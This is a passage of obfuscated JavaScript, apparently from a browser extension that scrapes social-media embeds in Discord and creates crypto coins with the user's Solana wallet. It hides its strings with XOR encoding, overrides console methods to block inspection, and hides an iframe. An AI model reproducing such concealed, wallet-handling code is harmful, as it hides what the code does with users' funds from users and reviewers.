                  o(623) + 'witter.com"], a[href*="x.com"]'
                ),
                f = [
                  ...Array.from(c)[o(T)]((t) => t[o(482)]),
                  ...((null == l ? void 0 : l.src) ? [l[o(594)]] : []),
                ];
              try {
                const e = t["querySelec" + o(562)](Oe.KeUvy),
                  n = r[o(C)],
                  a = new Set(Array.from(c).map((t) => t.href)),
                  u = new Set();
                for (const t of Array.from(e)) {
                  const e = t[o(C)];
                  e &&
                    e !== n &&
                    !a.has(e) &&
                    (e.includes(".twimg.") ||
                      e.toLowerCase()[o(E)]("https://t.co/") ||
                      u.has(e.toLowerCase()) ||
                      (u.add(e.toLowerCase()),
                      e[o(x)]("https://twitter.com") ||
                      e.startsWith(o(560) + "com")
                        ? i[o(P)](e)
                        : s.push(e)));
                }
              } catch (h) {
                o(R),
                  1,
                  h instanceof Error
                    ? h.message
                    : typeof h === o(O) ||
                      (h && "object" == typeof h && JSON[o(M)](h));
              }
              return {
                coinName: e || "",
                ticker: n || "",
                initialLiquidity:
                  (null == a ? void 0 : a.defaultSol[o(516)]()) || "1",
                twitterUrl: d ? r.href : "",
                websiteUrl: d ? "" : r.href,
                additionalTweets: Oe.zLMhl(i.length, 0) ? i : void 0,
                additionalWebsites: Oe[o(L)](s.length, 0) ? s : void 0,
                images: f[o(N)](Boolean),
                selectedImage: f[0] || "",
              };
            })(t, e, n, i);
            !a &&
              (a = ((t) => {
                var e, n, r, o, i, s;
                const a = 390,
                  u = 378,
                  c = 377,
                  l = 359,
                  d = 397,
                  f = 360,
                  h = 394,
                  p = 341,
                  m = 338,
                  g = 371,
                  y = 376,
                  w = 343,
                  b = 367,
                  v = 374,
                  A = 358,
                  k = 383,
                  I = 381,
                  S = 381,
                  _ = 340,
                  T = 379,
                  C = 353,
                  B = 381,
                  E = 375,
                  x = 357,
                  P = 386,
                  R = 365,
                  O = 374,
                  M = 386,
                  L = 379,
                  N = 335,
                  D = 327,
                  U = 329,
                  q = 386,
                  W = 398,
                  z = 386,
                  K = 350,
                  F = 386,
                  j = 400,
                  G = 336,
                  V = 337,
                  H = 396,
                  X = 352,
                  Z = 348,
                  J = 365,
                  Y = 348,
                  Q = 381,
                  $ = 344,
                  tt = 333,
                  et = 370,
                  nt = 366,
                  rt = 380,
                  ot = fy,
                  it = {};
                (it.vBrlK = 'a[href*="t' + ot(a) + '"], a[href*="x.com"]'),
                  (it.kRplV =
                    ".embedAuthorIcon__623de img, [" +
                    ot(334) +
                    'bedAuthor"] img'),
                  (it[ot(u)] =
                    ".embedMedi" +
                    ot(c) +
                    ot(388) +
                    'bedAuthorIcon__623de), [class*="imageCon' +
                    ot(l) +
                    ot(d) +
                    '="profile_' +
                    ot(f)),
                  (it.NTQcg = 'a[href*="/' + ot(h)),
                  (it[ot(p)] =
                    '[class*="imageContent"] img, [' +
                    ot(334) +
                    'bedMedia"] img'),
                  (it.WHIPl = 'a[href*="/' + ot(m) + ', a[href*="/p/"]'),
                  (it.HQQtj =
                    ot(g) + ot(y) + 'am.com"], ' + ot(w) + ot(b) + 'Icon"]'),
                  (it.PYTuJ = ot(v)),
                  (it[ot(A)] = ot(328)),
                  (it.HvUZR = "img"),
                  (it.apUPZ = function (t, e) {
                    return t === e;
                  }),
                  (it.ERDdL = ot(k)),
                  (it.hrerQ = function (t, e) {
                    return t === e;
                  });
                const st = it;
                try {
                  const a = !!t[ot(I) + "tor"](st.vBrlK),
                    u = !!t[ot(S) + "tor"](ot(_) + 'ruthsocial.com"]'),
                    c = !!t["querySelec" + ot(379)](ot(392) + 'nstagram.com"]');
                  let l = "",
                    d = "",
                    f = [];
                  if (a) {
                    l = ((null ==
                    (e = t["querySelec" + ot(T)](ot(C) + 'status/"]'))
                      ? void 0
                      : e.href) || "")
                      [ot(329)](/[\(\\)]/)[0]
                      .trim();
                    const r =
                      null == (n = t[ot(B) + "tor"](st[ot(E)]))
                        ? void 0
                        : n.src;
                    r && (d = r[ot(329)](/[\(\\)]/)[0][ot(386)]());
                    const o = Array.from(t[ot(B) + "torAll"](st.IblmN));
                    for (const t of o)
                      t[ot(x)] &&
                        f[ot(337)](t.src.split(/[\(\\)]/)[0][ot(P)]());
                    const i = Array[ot(R)](t["querySelec" + ot(396)](ot(O)));
                    for (const t of i)
                      t.poster &&
                        f[ot(337)](t[ot(398)].split(/[\(\\)]/)[0].trim());
                  } else if (u) {
                    l = (
                      (null == (r = t.querySelector(st.NTQcg))
                        ? void 0
                        : r.href) || ""
                    )
                      .split(/[\(\\)]/)[0]
                      [ot(M)]();
                    const e =
                      null ==
                      (o = t["querySelec" + ot(L)](
                        ot(g) + "profile_im" + ot(362) + ot(N) + ot(D) + 'on"]'
                      ))
                        ? void 0
                        : o.src;
                    e && (d = e[ot(U)](/[\(\\)]/)[0][ot(q)]());
                    const n = Array.from(t.querySelectorAll(st.MueCN));
                    for (const t of n)
                      t.src && f.push(t[ot(x)].split(/[\(\\)]/)[0].trim());
                    const i = Array.from(t.querySelectorAll("video"));
                    for (const t of i)
                      t[ot(W)] && f.push(t[ot(398)].split(/[\(\\)]/)[0].trim());
                  } else if (c) {
                    l = (
                      (null == (i = t[ot(B) + "tor"](st.WHIPl))
                        ? void 0
                        : i.href) || ""
                    )
                      .split(/[\(\\)]/)[0]
                      [ot(z)]();
                    const e =
                      null == (s = t[ot(381) + "tor"](st[ot(K)]))
                        ? void 0
                        : s.src;
                    e && (d = e.split(/[\(\\)]/)[0][ot(F)]());
                    const n = Array[ot(R)](
                      t.querySelectorAll(
                        ot(j) +
                          'mageContent"] img, [class*="embedMedia"]' +
                          ot(G)
                      )
                    );
                    for (const t of n)
                      t.src && f[ot(V)](t.src.split(/[\(\\)]/)[0][ot(386)]());
                    const r = Array[ot(365)](t["querySelec" + ot(H)](st.PYTuJ));
                    for (const t of r)
                      t.poster &&
                        f[ot(337)](t[ot(W)][ot(U)](/[\(\\)]/)[0].trim());
                  }
                  if (
                    (!l &&
                      (l =
                        Array.from(t.querySelectorAll(st.QgCnK))
                          [ot(X)]((t) => t.href)
                          .find(
                            (t) =>
                              /twitter\.com\/\w+\/status\/\d+/[ot(344)](t) ||
                              /truthsocial\.com\/@\w+\/posts\/\d+/[ot(344)](
                                t
                              ) ||
                              /instagram\.com\/(p|reel|stories)\/[\w-]+/[
                                ot(344)
                              ](t)
                          ) || ""),
                    0 === f[ot(Z)])
                  ) {
                    const e = Array[ot(J)](t["querySelec" + ot(396)](st.HvUZR));
                    for (const t of e) {
                      const e = t.src;
                      /pbs\.twimg\.com\/(amplify_video_thumb|media|card_img)/[
                        ot(344)
                      ](e) && f.push(e);
                    }
                    if (0 === f[ot(Y)]) {
                      const e = Array.from(t["querySelec" + ot(H)]("video"));
                      for (const t of e) t.poster && f.push(t.poster);
                    }
                  }
                  if (!d) {
                    const e = Array.from(t[ot(Q) + ot(396)](st.HvUZR));
                    for (const t of e) {
                      const e = t[ot(357)];
                      if (/profile_images.+\.(png|jpg|jpeg|webp)/[ot($)](e)) {
                        d = e;
                        break;
                      }
                    }
                  }
                  const h = Zg[ot(tt) + "e"]().getSettings();
                  return {
                    coinName: "",
                    ticker: "",
                    initialLiquidity:
                      (null == h ? void 0 : h[ot(et)].toString()) || "1",
                    twitterUrl: a ? l : "",
                    websiteUrl: a ? "" : l,
                    images: [...f, d].filter(Boolean),
                    selectedImage: f[0] || d,
                  };
                } catch (at) {
                  return (
                    ot(nt),
                    1,
                    at instanceof Error
                      ? at.message
                      : st.apUPZ(typeof at, st[ot(rt)]) ||
                        (at &&
                          st.hrerQ(typeof at, "object") &&
                          JSON.stringify(at)),
                    null
                  );
                }
              })(t));
            const u = Jg.getInstance();
            if (u[o(m)]()) {
              const t = u.getWallet();
              await (null == (r = Og[o(g) + "nt"]())
                ? void 0
                : r.getCachedBalance(null == t ? void 0 : t.publicKey));
            }
            await FR(s.getConnection()), Oe.JClpJ(B, a);
          } catch (i) {
            Oe.AYfjL,
              Oe[o(y)](i, Error)
                ? i[o(w)]
                : Oe.MuLlJ(typeof i, "string") ||
                  (i && Oe.MuLlJ(typeof i, o(b)) && JSON[o(v)](i)),
              B(null);
          }
        };
      (() => {
        const t = Re,
          e = new MutationObserver(De),
          n = {};
        (n[t(W)] = !![]),
          (n.subtree = !![]),
          e[t(z)](document.body, n),
          document.addEventListener(t(600) + "Loaded", De);
      })();
    },
  });
  const sO = gO;
  !(function (t) {
    const e = 447,
      n = 441,
      r = 344,
      o = 453,
      i = 362,
      s = 347,
      a = 446,
      u = 429,
      c = gO,
      l = t();
    for (; []; )
      try {
        if (
          298355 ===
          parseInt(c(e)) / 1 +
            -parseInt(c(397)) / 2 +
            (parseInt(c(n)) / 3) * (-parseInt(c(r)) / 4) +
            (parseInt(c(o)) / 5) * (-parseInt(c(i)) / 6) +
            -parseInt(c(s)) / 7 +
            parseInt(c(a)) / 8 +
            (-parseInt(c(u)) / 9) * (-parseInt(c(345)) / 10)
        )
          break;
        l.push(l.shift());
      } catch (d) {
        l.push(l.shift());
      }
  })(pO);
  const aO = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    uO = aO(void 0, function () {
      const t = 424,
        e = 380,
        n = 409,
        r = gO,
        o = {};
      o[r(t)] = r(e) + "+$";
      const i = o;
      return uO[r(n)]()
        [r(455)](i[r(t)])
        .toString()
        .constructor(uO)
        .search("(((.+)+)+)+$");
    });
  uO();
  const cO = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    lO = cO(void 0, function () {
      const t = 374,
        e = 419,
        n = 425,
        r = 412,
        o = 462,
        i = 356,
        s = 383,
        a = gO,
        u = {
          BxXdo: function (t, e) {
            return t + e;
          },
          lAsnj: a(368) + a(379),
          Udncj: function (t) {
            return t();
          },
          SWrMZ: a(t),
          WfbeJ: a(e),
          cqbSd: function (t, e) {
            return t < e;
          },
        };
      let c;
      try {
        const t = Function(
          u[a(456)](u[a(390)] + '{}.constructor("return this")( )', ");")
        );
        c = u.Udncj(t);
      } catch (f) {
        c = window;
      }
      const l = (c.console = c.console || {}),
        d = ["log", a(n), "info", a(r), u.SWrMZ, u.WfbeJ, a(o)];
      for (let h = 0; u.cqbSd(h, d[a(432)]); h++) {
        const t = cO[a(431) + "r"][a(i)].bind(cO),
          e = d[h],
          n = l[e] || t;
        (t.__proto__ = cO.bind(cO)),
          (t.toString = n.toString[a(s)](n)),
          (l[e] = t);
      }
    });
  lO(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const dO = () => {
      const t = function (t, e) {
        return t(e);
      };
      window[gO([370][0]) + "stener"]("message", async (e) => {
        const n = e.data,
          r = mO[n.type];
        r && t(r, n);
      });
    },
    fO = async (t) => {
      const e = 367,
        n = 418,
        r = 417,
        o = 396,
        i = 366,
        s = 415,
        a = 395,
        u = 432,
        c = 364,
        l = 432,
        d = 411,
        f = 404,
        h = 365,
        p = 432,
        m = 437,
        g = 449,
        y = gO,
        w = {
          yYoTI: function (t, e) {
            return t < e;
          },
          fOOpb: function (t, e) {
            return t & e;
          },
          bwmIV: function (t, e) {
            return t >>> e;
          },
          eDgqf: function (t, e) {
            return t * e;
          },
          MYSMx: function (t, e) {
            return t % e;
          },
          ewwZp: function (t, e) {
            return t ^ e;
          },
          RQWrx: function (t, e) {
            return t < e;
          },
          IdXAR: function (t, e) {
            return t >>> e;
          },
          UAvCe: function (t, e) {
            return t ^ e;
          },
          WzcIV: function (t, e) {
            return t >>> e;
          },
          ztaol: function (t, e) {
            return t * e;
          },
          EWNwB: function (t, e) {
            return t ^ e;
          },
          QxCxw: function (t, e) {
            return t % e;
          },
          UBvGh: function (t, e) {
            return t === e;
          },
          xNVrx: function (t, e) {
            return t(e);
          },
          dqVqi: "Invalid co" + y(452) + "ovided",
          DRmIV: function (t, e) {
            return t instanceof e;
          },
          MExGo: "string",
          vPkSN: function (t, e) {
            return t(e);
          },
        };
      t[y(e)][y(n) + "uidity"].replace(/,/g, ".");
      const b = Xg[y(350) + "e"]();
      if (
        w.UBvGh(
          t[y(r)],
          (function () {
            const t = 432,
              e = 384,
              n = 434,
              r = 428,
              o = 411;
            let i;
            return function () {
              const s = gO;
              if (!i) {
                const a = new Uint8Array([
                    197, 137, 229, 142, 210, 158, 255, 140, 201, 146, 238, 144,
                    181, 131,
                  ]),
                  u = -811541626,
                  c = new Uint8Array(a.length);
                for (let o = 0; w.yYoTI(o, a[s(t)]); o++) {
                  const t = w[s(e)](
                    w[s(n)](u, w[s(381)](w.MYSMx(o, 4), 8)),
                    255
                  );
                  c[o] = w[s(r)](a[o], t);
                }
                i = new TextDecoder()[s(o)](c);
              }
              return i;
            };
          })()()
        )
      )
        return (
          w[y(o)](x, {
            type: (function () {
              const t = 432;
              let e;
              return function () {
                const n = gO;
                if (!e) {
                  const r = new Uint8Array([
                      195, 148, 233, 129, 223, 152, 242, 138, 193, 143, 229,
                      144, 198, 154, 233, 131,
                    ]),
                    o = -811541632,
                    i = new Uint8Array(r[n(t)]);
                  for (let t = 0; t < r.length; t++) {
                    const e = (o >>> ((t % 4) * 8)) & 255;
                    i[t] = r[t] ^ e;
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
            detail: (function () {
              const t = 352,
                e = 375,
                n = {
                  lxrXm: function (t, e) {
                    return w.yYoTI(t, e);
                  },
                  dpwbv: function (t, e) {
                    return w.MYSMx(t, e);
                  },
                };
              let r;
              return function () {
                const o = gO;
                if (!r) {
                  const i = new Uint8Array([
                      203, 174, 204, 187, 239, 251, 196, 170, 246, 183, 207,
                      182, 166, 172, 201, 163, 234, 251, 194, 170, 166, 184,
                      207, 162, 239, 181, 199, 239, 245, 180, 207, 161, 167,
                    ]),
                    s = -811541626,
                    a = new Uint8Array(i[o(432)]);
                  for (let r = 0; n[o(t)](r, i.length); r++) {
                    const t = (s >>> (8 * n[o(e)](r, 4))) & 255;
                    a[r] = i[r] ^ t;
                  }
                  r = new TextDecoder().decode(a);
                }
                return r;
              };
            })()(),
          }),
          ![]
        );
      if (!b.isUserAuthenticated())
        return (
          x({
            type: (function () {
              const t = 432,
                e = 432,
                n = 382,
                r = 411,
                o = {
                  cBbld: function (t, e) {
                    return w.RQWrx(t, e);
                  },
                  OMUfd: function (t, e) {
                    return w.IdXAR(t, e);
                  },
                };
              let i;
              return function () {
                const s = gO;
                if (!i) {
                  const a = new Uint8Array([
                      199, 148, 233, 129, 219, 152, 242, 138, 197, 143, 229,
                      144, 194, 154, 233, 131,
                    ]),
                    u = -811541628,
                    c = new Uint8Array(a[s(t)]);
                  for (let t = 0; o.cBbld(t, a[s(e)]); t++) {
                    const e = 255 & o[s(n)](u, (t % 4) * 8);
                    c[t] = a[t] ^ e;
                  }
                  i = new TextDecoder()[s(r)](c);
                }
                return i;
              };
            })()(),
            detail: (function () {
              const t = {
                FkvjT: function (t, e) {
                  return t >>> e;
                },
                JKkwx: function (t, e) {
                  return t * e;
                },
                goruy: function (t, e) {
                  return w.UAvCe(t, e);
                },
              };
              let e;
              return function () {
                const n = gO;
                if (!e) {
                  const r = new Uint8Array([
                      211, 168, 197, 189, 166, 186, 213, 187, 238, 190, 206,
                      187, 239, 184, 193, 187, 239, 180, 206, 239, 224, 186,
                      201, 163, 227, 191, 129,
                    ]),
                    o = -811541626,
                    i = new Uint8Array(r.length);
                  for (let e = 0; e < r[n(p)]; e++) {
                    const s = 255 & t[n(m)](o, t.JKkwx(e % 4, 8));
                    i[e] = t[n(g)](r[e], s);
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()(),
          }),
          ![]
        );
      const v = Yg["validateCo" + y(444)](t.data);
      if (!v)
        return (
          w.xNVrx(x, {
            type: (function () {
              const t = {};
              (t[y(h)] = function (t, e) {
                return t < e;
              }),
                (t.MwexC = function (t, e) {
                  return t % e;
                });
              const e = t;
              let n;
              return function () {
                if (!n) {
                  const t = new Uint8Array([
                      203, 148, 233, 129, 215, 152, 242, 138, 201, 143, 229,
                      144, 206, 154, 233, 131,
                    ]),
                    r = -811541624,
                    o = new Uint8Array(t.length);
                  for (let n = 0; e.cwlja(n, t.length); n++) {
                    const i = (r >>> (8 * e.MwexC(n, 4))) & 255;
                    o[n] = t[n] ^ i;
                  }
                  n = new TextDecoder().decode(o);
                }
                return n;
              };
            })()(),
            detail: w[y(i)],
          }),
          ![]
        );
      const A = Zg.getInstance().getSettings();
      try {
        if ("mogtechRPC" === (null == A ? void 0 : A[y(s) + "de"])) {
          const { msg: t, success: e } = await YR(v, ![], A.rpcMode);
          return (
            x(
              e
                ? {
                    type: (function () {
                      const t = 386,
                        e = {
                          vRTni: function (t, e) {
                            return t * e;
                          },
                          LyVmR: function (e, n) {
                            return w[gO(t)](e, n);
                          },
                        };
                      let n;
                      return function () {
                        const t = gO;
                        if (!n) {
                          const r = new Uint8Array([
                              197, 137, 229, 142, 210, 158, 255, 140, 201, 146,
                              238, 144, 213, 142, 227, 140, 195, 136, 243,
                            ]),
                            o = -811541626,
                            i = new Uint8Array(r.length);
                          for (let n = 0; n < r.length; n++) {
                            const s = (o >>> e.vRTni(n % 4, 8)) & 255;
                            i[n] = e[t(f)](r[n], s);
                          }
                          n = new TextDecoder().decode(i);
                        }
                        return n;
                      };
                    })()(),
                  }
                : {
                    type: (function () {
                      let t;
                      return function () {
                        const e = gO;
                        if (!t) {
                          const n = new Uint8Array([
                              199, 148, 233, 129, 219, 152, 242, 138, 197, 143,
                              229, 144, 194, 154, 233, 131,
                            ]),
                            r = -811541628,
                            o = new Uint8Array(n[e(l)]);
                          for (let t = 0; t < n[e(432)]; t++) {
                            const e = w.fOOpb(r >>> ((t % 4) * 8), 255);
                            o[t] = n[t] ^ e;
                          }
                          t = new TextDecoder()[e(d)](o);
                        }
                        return t;
                      };
                    })()(),
                    detail: t,
                  }
            ),
            e
          );
        }
        {
          const { msg: t, success: e } = await $R(
            v,
            null == A ? void 0 : A[y(427)]
          );
          return (
            e
              ? x({
                  type: (function () {
                    const t = 399,
                      e = 400;
                    let n;
                    return function () {
                      const r = gO;
                      if (!n) {
                        const o = new Uint8Array([
                            197, 137, 229, 142, 210, 158, 255, 140, 201, 146,
                            238, 144, 213, 142, 227, 140, 195, 136, 243,
                          ]),
                          i = -811541626,
                          s = new Uint8Array(o.length);
                        for (let n = 0; n < o.length; n++) {
                          const a =
                            255 & w[r(410)](i, w[r(t)](w[r(e)](n, 4), 8));
                          s[n] = w.EWNwB(o[n], a);
                        }
                        n = new TextDecoder().decode(s);
                      }
                      return n;
                    };
                  })()(),
                })
              : w.xNVrx(x, {
                  type: (function () {
                    const t = 432,
                      e = 346,
                      n = y,
                      r = {};
                    (r[n(c)] = function (t, e) {
                      return t >>> e;
                    }),
                      (r.GEzxW = function (t, e) {
                        return t * e;
                      });
                    const o = r;
                    let i;
                    return function () {
                      const r = n;
                      if (!i) {
                        const n = new Uint8Array([
                            195, 148, 233, 129, 223, 152, 242, 138, 193, 143,
                            229, 144, 198, 154, 233, 131,
                          ]),
                          s = -811541632,
                          a = new Uint8Array(n.length);
                        for (let i = 0; i < n[r(t)]; i++) {
                          const t = 255 & o.PcdUg(s, o[r(e)](i % 4, 8));
                          a[i] = n[i] ^ t;
                        }
                        i = new TextDecoder().decode(a);
                      }
                      return i;
                    };
                  })()(),
                  detail: t,
                }),
            e
          );
        }
      } catch (k) {
        let t = "Coin creation failed";
        return (
          w.DRmIV(k, Error)
            ? (t = k.message)
            : typeof k === w.MExGo
            ? (t = k)
            : k && typeof k === y(a) && (t = JSON[y(438)](k)),
          w.vPkSN(x, {
            type: (function () {
              let t;
              return function () {
                const e = gO;
                if (!t) {
                  const n = new Uint8Array([
                      197, 148, 233, 129, 217, 152, 242, 138, 199, 143, 229,
                      144, 192, 154, 233, 131,
                    ]),
                    r = -811541626,
                    o = new Uint8Array(n[e(u)]);
                  for (let t = 0; t < n.length; t++) {
                    const i = (r >>> w[e(381)](w.QxCxw(t, 4), 8)) & 255;
                    o[t] = n[t] ^ i;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
            detail: t,
          }),
          ![]
        );
      }
    },
    hO = {};
  function pO() {
    const t = [
      "vuf2q2u",
      "rMfYwvG",
      "B0rbD1G",
      "v05YshG",
      "BefZBMO",
      "se9QsKW",
      "DLb6vuS",
      "ug9IAfe",
      "tK5OBeO",
      "B2jQzwn0",
      "Ee5wCNG",
      "nZm4otm4CfnYzMnf",
      "z2v0qMfSyw5Jzq",
      "ENrHB2W",
      "tvLttxG",
      "zfziAhi",
      "CgvYy2vUDa",
      "wxbqwue",
      "thLwBvi",
      "wuHItfe",
      "suHstLa",
      "DePpEKq",
      "EfblBva",
      "Dg9tDhjPBMC",
      "v3PJsvy",
      "zgvJB2rL",
      "zxjYB3i",
      "q1jfqvrfx0npsq",
      "rKz2whK",
      "C2vSzwn0zwrnBW",
      "B2DVBum",
      "DhLWzq",
      "Aw5PDgLHBeXPCq",
      "DgfIBgu",
      "q2r0v2K",
      "D2jHzey",
      "y2fSBfjWyW",
      "uhvUq0q",
      "vMP0ruu",
      "D2fYBG",
      "zvrPthG",
      "CNbJtw9Kzq",
      "zxD3wNa",
      "ota5wwnpz0nq",
      "C3rYAw5N",
      "y29UC3rYDwn0BW",
      "BgvUz3rO",
      "A0zUuw8",
      "yNDTsvy",
      "DxbKyxrLu2v0Da",
      "q0Xpu0vFvuK",
      "rMT2ALq",
      "C3rYAw5NAwz5",
      "refuqq",
      "CgfYyw1Z",
      "ndCZodG5y1jetene",
      "Bw9NDgvJAfjqqW",
      "D2fPDezVCKXVyq",
      "Aw5eyxrH",
      "tKvdvf9srvfvrq",
      "ndC0nJyXnNjcqNzyvG",
      "ntK1mZmZy0nbs2Tj",
      "zxnStMe",
      "z29YDxK",
      "CMvWBgfJzq",
      "uMP6DLO",
      "Aw4Gzgf0ysbWCG",
      "ndq1vwHZChDj",
      "DxnLCG",
      "C2vHCMnO",
      "qNHyzg8",
      "u0vmta",
      "t3vtCLC",
      "ELjqr1a",
      "zw50AwnHDgvK",
      "tL9gt1jn",
      "DhjHy2u",
      "t2HZz1e",
      "mtjbuK5XCeq",
      "nZyXndbkEeDHu2G",
      "r0v6EfC",
      "mJG0ntmWnejXD05sCW",
      "z2v0qwrKCMvZCW",
      "zhfICg0",
      "z2v0sw5ZDgfUyW",
      "z2v0v2fSBgv0",
      "BhHYwg0",
      "Bwv0Ag9K",
      "ugrlufy",
      "qMfSyw5Jzq",
      "ChjVDg90ExbL",
      "twXyzMG",
      "v2zpAMm",
      "v0fmtevux0nptG",
      "vw5RBM93BIbLCG",
      "vKnnExq",
      "mJC2mdzXuMTPCuK",
      "AxnvC2vYqxv0Aa",
      "ugnKvwC",
      "y3DSAMe",
      "zhfwCwK",
      "zgf0yq",
      "CMv0DxjUicHMDq",
      "q1DRt0q",
      "ywrKrxzLBNrmAq",
      "q09otKvdvf9srq",
      "EgvPrLu",
      "Ag9zrMO",
      "zxHJzxb0Aw9U",
      "zhb3yNy",
      "tefoq0u",
      "vgn6s00",
      "uwzyChG",
      "BMn0Aw9UkcKG",
      "kcGOlISPkYKRkq",
      "zurNCwy",
      "t01vzMq",
      "yMLUza",
      "zK9pCgi",
      "t3nhEwK",
    ];
    return (pO = function () {
      return t;
    })();
  }
  (hO.IFRAME_READY = async (t) => {
    var e;
    const n = 433,
      r = 443,
      o = 348,
      i = 398,
      s = 405,
      a = 432,
      u = 411,
      c = 433,
      l = gO,
      d = {};
    (d[l(369)] = function (t, e) {
      return t & e;
    }),
      (d[l(n)] = function (t, e) {
        return t % e;
      });
    const f = d,
      h = Jg.getInstance();
    await h[l(r) + "d"]();
    const p = h.getWallet();
    p &&
      (x({
        type: (function () {
          const t = function (t, e) {
              return f.CWkOD(t, e);
            },
            e = function (t, e) {
              return t >>> e;
            },
            n = function (t, e) {
              return t * e;
            },
            r = function (t, e) {
              return f[gO(c)](t, e);
            };
          let o;
          return function () {
            const i = gO;
            if (!o) {
              const s = new Uint8Array([
                  209, 154, 236, 131, 195, 143, 255, 140, 201, 149, 238, 138,
                  197, 143, 229, 139,
                ]),
                c = -811541626,
                l = new Uint8Array(s.length);
              for (let o = 0; o < s[i(a)]; o++) {
                const i = t(e(c, n(r(o, 4), 8)), 255);
                l[o] = s[o] ^ i;
              }
              o = new TextDecoder()[i(u)](l);
            }
            return o;
          };
        })()(),
        address: h[l(o)](),
        publicKey: h.getAddress(),
      }),
      await (null == (e = Og.getRpcClient()) ? void 0 : e[l(i)](p.publicKey))),
      x({
        type: (function () {
          const t = 405,
            e = 411,
            n = l,
            r = {};
          r[n(s)] = function (t, e) {
            return t & e;
          };
          const o = r;
          let i;
          return function () {
            const r = n;
            if (!i) {
              const n = new Uint8Array([
                  193, 131, 244, 138, 202, 136, 233, 128, 202, 132, 242, 138,
                  197, 159, 249,
                ]),
                s = -811541628,
                a = new Uint8Array(n.length);
              for (let e = 0; e < n.length; e++) {
                const i = o[r(t)](s >>> ((e % 4) * 8), 255);
                a[e] = n[e] ^ i;
              }
              i = new TextDecoder()[r(e)](a);
            }
            return i;
          };
        })()(),
      });
  }),
    (hO[sO(413) + sO(461)] = fO),
    (hO.CREATE_COIN = fO),
    (hO[sO(413) + "N_3X"] = fO),
    (hO["AUTH_USER_" + sO(439)] = async (t) => {
      const e = 406,
        n = 416,
        r = gO,
        o = {
          PobhQ: function (t, e, n) {
            return t(e, n);
          },
        },
        i = Xg.getInstance(),
        s = Zg.getInstance(),
        a = await i.authenticateUser(t[r([454][0])]);
      if (!a)
        return (
          o[r(393)](
            Bg,
            (function () {
              const t = {
                  RbwNw: function (t, e) {
                    return t < e;
                  },
                  IHRNP: function (t, e) {
                    return t * e;
                  },
                  ogomC: function (t, e) {
                    return t ^ e;
                  },
                },
                r = t;
              let o;
              return function () {
                const t = gO;
                if (!o) {
                  const i = new Uint8Array([
                      197, 174, 212, 167, 225, 181, 212, 166, 231, 186, 212,
                      166, 235, 181, 128, 169, 229, 178, 204, 170, 224, 250,
                      128, 131, 235, 188, 199, 166, 234, 188, 128, 160, 241,
                      175, 142,
                    ]),
                    s = -811541628,
                    a = new Uint8Array(i.length);
                  for (let o = 0; r.RbwNw(o, i.length); o++) {
                    const u = (s >>> r[t(e)](o % 4, 8)) & 255;
                    a[o] = r[t(n)](i[o], u);
                  }
                  o = new TextDecoder().decode(a);
                }
                return o;
              };
            })()(),
            "error"
          ),
          C(),
          i.logout(),
          void 0
        );
      a && s.getSettings();
    }),
    (hO.SETTINGS_DATA = (t) => {
      const e = 409,
        n = 435,
        r = 389,
        o = 430,
        i = 438,
        s = gO,
        a = {
          WNrHx: function (t) {
            return t();
          },
        };
      try {
        const o = Xg[s(350) + "e"]();
        if (
          (t.data.defaultSol[s(e)]()[s(450)](/,/g, "."),
          !o[s(363) + "enticated"]())
        )
          return;
        const i = Zg[s(350) + "e"]();
        i[s(n) + "ings"](t.data) &&
          (a[s(r)](ay),
          (() => {
            const t = 619,
              e = 612,
              n = 524,
              r = tO,
              o = document.querySelectorAll(
                r(t) + r(649) + r(e) + ".grid__623de"
              );
            for (let i = 0; i < o[r(n)]; ++i) iy(o[i]);
          })());
      } catch (u) {
        s(360),
          1,
          u instanceof Error
            ? u.message
            : typeof u === s(o) || (u && "object" == typeof u && JSON[s(i)](u));
      }
    }),
    (hO[sO(436)] = async (t) => {
      (() => {
        const t = 499,
          e = 497,
          n = 541,
          r = 498,
          o = 549,
          i = 490,
          s = I,
          a = {};
        a[s(541)] = s(t);
        const u = a,
          { iframe: c } = v();
        if (!c) return;
        (c.style[s(e)] = u[s(n)]),
          (c[s(r)].opacity = "0"),
          (c.style[s(o) + s(523)] = u[s(n)]);
        const l = {};
        (l[s(i) + "ble"] = ![]), A(l);
      })();
    }),
    (hO[sO(457)] = async (t) => {
      const e = 442,
        n = 350,
        r = 363,
        o = 460,
        i = 414,
        s = 402,
        a = gO,
        u = {};
      (u[a(414)] = function (t, e) {
        return t === e;
      }),
        (u[a(358)] = a(e));
      const c = u;
      if (!Xg[a(n) + "e"]()[a(r) + a(o)]()) return;
      const l = Zg[a(n) + "e"]().getSettings();
      c[a(i)](null == l ? void 0 : l.selectedMode, c.WfOjc)
        ? await QR(t.percent, null == l ? void 0 : l.rpcMode)
        : await (async (t) => {
            const e = LR,
              n = function (t, e) {
                return t(e);
              },
              r = e([292][0]);
            try {
              await n(MR, t);
            } catch (o) {
              o instanceof Error
                ? o[e(224)]
                : typeof o === r ||
                  (o && "object" == typeof o && JSON.stringify(o));
            }
          })(t[a(s)]);
    }),
    (hO[sO(359) + sO(445) + "ST"] = async (t) => {
      var e;
      const n = 349,
        r = 361,
        o = 423,
        i = 360,
        s = 350,
        a = 351,
        u = 378,
        c = 432,
        l = 432,
        d = 349,
        f = 361,
        h = 432,
        p = gO,
        m = {};
      (m[p(394)] = function (t, e) {
        return t >>> e;
      }),
        (m.dVHhr = function (t, e) {
          return t * e;
        }),
        (m.zQQJR = function (t, e) {
          return t & e;
        }),
        (m.WcSCv = function (t, e) {
          return t >>> e;
        }),
        (m[p(n)] = function (t, e) {
          return t * e;
        }),
        (m[p(r)] = function (t, e) {
          return t ^ e;
        }),
        (m[p(o)] = function (t, e) {
          return t < e;
        }),
        (m.CdtWi = function (t, e) {
          return t >>> e;
        }),
        (m.Zqhww = p(i) + "ror"),
        (m.QfXpx = function (t, e) {
          return t === e;
        });
      const g = m;
      try {
        const t = Jg[p(s) + "e"]();
        await t.waitForLoad();
        const n = t[p(a)]();
